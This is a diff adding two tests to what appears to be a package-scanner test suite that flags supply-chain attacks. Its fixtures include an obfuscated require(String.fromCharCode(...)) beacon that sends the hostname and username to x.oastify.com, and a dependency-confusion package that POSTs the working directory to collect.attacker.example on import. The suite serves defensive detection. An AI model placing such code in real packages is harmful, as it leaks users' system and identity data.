@@ -180,6 +180,24 @@ test('ignores inline source maps', async () => {
   assert.ok(!ids(r).includes('hidden-command'));
 });
 
+test('sees through require(String.fromCharCode(...)) beacons', async () => {
+  const r = await scanFiles({
+    'package.json': '{"name":"cos-sdk","version":"999.0.0","main":"index.js"}',
+    'index.js': 'const a=require(String.fromCharCode(111,115));const h=require(String.fromCharCode(104,116,116,112));\nh.request({host:"x.oastify.com",path:"/?"+a.hostname()+a.userInfo().username}).end();\n',
+  });
+  assert.equal(r.verdict, 'BLOCK');
+  assert.ok(ids(r).includes('obfuscated-exec'));
+});
+
+test('a squatted version that touches the network on import is an attack', async () => {
+  const r = await scanFiles({
+    'package.json': '{"name":"@corp/ui-lib","version":"99.9.0","main":"index.js"}',
+    'index.js': "const https=require('https');https.request({hostname:'collect.attacker.example',method:'POST'}).end(JSON.stringify({p:process.cwd()}));\n",
+  });
+  assert.equal(r.verdict, 'BLOCK');
+  assert.ok(ids(r).includes('confusion-attack'));
+});
+
 test('flags stealer libraries in dependencies', async () => {
   const r = await scanFiles({ 'setup.py': 'from setuptools import setup\nsetup(name="x", install_requires=["browser_cookie3", "requests"])\n' });
   assert.ok(ids(r).includes('stealer-dependency'));
